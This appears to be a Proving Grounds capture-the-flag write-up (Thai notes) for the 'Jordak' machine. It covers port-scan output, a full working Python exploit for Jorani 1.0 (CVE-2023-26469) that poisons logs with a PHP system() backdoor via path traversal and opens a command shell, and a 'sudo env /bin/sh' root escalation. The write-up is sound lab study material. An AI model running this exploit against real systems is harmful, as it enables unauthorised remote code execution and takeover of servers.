# Recon

## TCP Scan 

```bash
sudo ../Tools/scan.sh  192.168.175.109
[*] Running rustscan...
[*] Running nmap on ports: 22,80
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-24 21:48 +07
Nmap scan report for 192.168.175.109
Host is up (0.032s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 76:18:f1:19:6b:29:db:da:3d:f6:7b:ab:f4:b5:63:e0 (ECDSA)
|_  256 cb:d8:d6:ef:82:77:8a:25:32:08:dd:91:96:8d:ab:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.89 seconds

```

จากข้อมูลข้างต้นทดสอบเข้า http://192.168.175.109/evox/about ซึ่งพบว่าสามารถเข้าได้ 
![[Challenge/ProvingGround/Jordak/IMG/001.png]]

นำข้อมูล version ของ Jorani v 1.0  ไปค้นหาจะพบว่ามีช่องโหว่ remote code exec
![[Challenge/ProvingGround/Jordak/IMG/002.png]]

poc.py ที่ได้มาใช้ไม่ได้ ให้ลองใช้อีก payload ด้านล่าง
https://github.com/Orange-Cyberdefense/CVE-repository/blob/master/PoCs/CVE_Jorani.py 

```bash
"""
vulnerability covered by CVE-2023-26469
"""
import readline
import requests
import datetime
import sys
import re
import base64
import random
import string

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

msg = lambda x,y="\n":print(f'\x1b[92m[+]\x1b[0m {x}', end=y)
err = lambda x,y="\n":print(f'\x1b[91m[x]\x1b[0m {x}', end=y)
log = lambda x,y="\n":print(f'\x1b[93m[?]\x1b[0m {x}', end=y)

CSRF_PATTERN = re.compile('<input type="hidden" name="csrf_test_jorani" value="(.*?)"')
CMD_PATTERN = re.compile('---------(.*?)---------', re.S)

URLS = {
	'login' : '/session/login',
	'view'	: '/pages/view/',
}

alphabet = string.ascii_uppercase
HEADER_NAME = ''.join(random.choice(alphabet) for i in range(12))

BypassRedirect = {
	'X-REQUESTED-WITH'	: 'XMLHttpRequest',
	HEADER_NAME		: ""
}

INPUT = "\x1b[92mjrjgjk\x1b[0m@\x1b[41mjorani\x1b[0m(PSEUDO-TERM)\n$ " # The input used for the pseudo term

u = lambda x,y: x + URLS[y]

POISON_PAYLOAD		= "<?php if(isset($_SERVER['HTTP_" + HEADER_NAME + "'])){system(base64_decode($_SERVER['HTTP_" + HEADER_NAME + "']));} ?>"
PATH_TRAV_PAYLOAD	= "../../application/logs"

if __name__ == '__main__':
	print("""
	/!\\ Do not use this if you are not authorized to /!\\
		""")
	log("POC made by @jrjgjk (Guilhem RIOUX)", "\n\n")

	if(len(sys.argv) == 1):
		err(f"Usage: {sys.argv[0]} <url>")
		exit(0)

	log(f"Header used for exploit: {HEADER_NAME}")	
	

	t = sys.argv[1]

	s = requests.Session()
	log("Requesting session cookie")
	res = s.get(u(t,"login"), verify = False)

	C = s.cookies.get_dict()

	Date = datetime.date.today()
	log_file_name = f"log-{Date.year}-{str(Date.month).zfill(2)}-{str(Date.day).zfill(2)}"

	csrf_token = re.findall(CSRF_PATTERN, res.text)[0] 
	log(f"Poisonning log file with payload: '{POISON_PAYLOAD}'")
	log(f"Set path traversal to '{PATH_TRAV_PAYLOAD}'")
	msg(f"Recoveredd CSRF Token: {csrf_token}")

	data = {
		"csrf_test_jorani"	: csrf_token,
		"last_page"			: "session/login",
		"language"			: PATH_TRAV_PAYLOAD,
		"login"				: POISON_PAYLOAD,
		"CipheredValue"		: "DummyPassword"
	}

	s.post(u(t,"login"), data=data)

	log(f"Accessing log file: {log_file_name}")

	exp_page = t + URLS['view'] + log_file_name

	### Shell
	cmd = ""
	while True:
		cmd = input(INPUT)
		if(cmd in ['x', 'exit', 'quit']):
			break
		elif(cmd == ""):
			continue
		else:
			BypassRedirect[HEADER_NAME] = base64.b64encode(b"echo ---------;" + cmd.encode() + b" 2>&1;echo ---------;")
			res = s.get(exp_page, headers=BypassRedirect)
			cmdRes = re.findall(CMD_PATTERN, res.text)
			try:
				print(cmdRes[0])
			except:
				print(res.text)
				err("Wow, there was a problem, are you sure of the URL ??")
				err('exiting..')
				exit(0)

```

# Shell as jordak

![[Challenge/ProvingGround/Jordak/IMG/003.png]]

ทำ reverse shell กลับไปหาอีกครั้งด้วย OpenSSL 
![[Challenge/ProvingGround/Jordak/IMG/004.png]]
# Priv esc 

![[Challenge/ProvingGround/Jordak/IMG/005.png]]

![[Challenge/ProvingGround/Jordak/IMG/006.png]]
# Shell as root

```bash
sudo env /bin/sh 
```

# PWN 